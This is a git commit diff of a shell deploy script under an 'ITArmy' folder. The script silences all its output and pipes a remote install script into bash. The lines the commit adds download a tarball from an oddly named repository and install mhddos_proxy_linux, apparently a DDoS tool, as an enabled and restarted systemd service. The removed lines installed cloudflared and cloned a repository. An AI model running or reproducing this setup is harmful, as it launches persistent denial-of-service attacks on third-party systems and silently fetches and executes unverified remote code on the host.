191ee5143888c78b09ff933bb7a99e06fa9fb10e
pornnewbee <65003745+pornnewbee@users.noreply.github.com>
2026-01-06 00:41:04 +0800

    Update deploy.sh

--- sub/ITArmy/deploy.sh
+++ sub/ITArmy/deploy.sh
@@ -5,16 +5,10 @@ exec > /dev/null 2>&1
 echo "[*] Run install script"
 curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
 wget https://github.com/sweetasshole/test/raw/refs/heads/main/itarmy.tar.gz
-
-
-echo "[*] Install tools"
-curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
-  -o /usr/local/bin/cloudflared
-chmod +x /usr/local/bin/cloudflared
-
-
-echo "Clone assets"
-# 注意：这里不使用 sudo，避免 gh auth 失效
-git clone https://github.com/pornnewbee/blue.git /mnt/repo/logpush
-
-
+tar -xzvf itarmy.tar.gz
+cp ./itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin
+chmod +x /opt/itarmy/bin/mhddos_proxy_linux
+cp ./itarmy/mhddos.service /etc/systemd/system
+systemctl daemon-reload
+systemctl enable mhddos.service
+systemctl restart mhddos.service
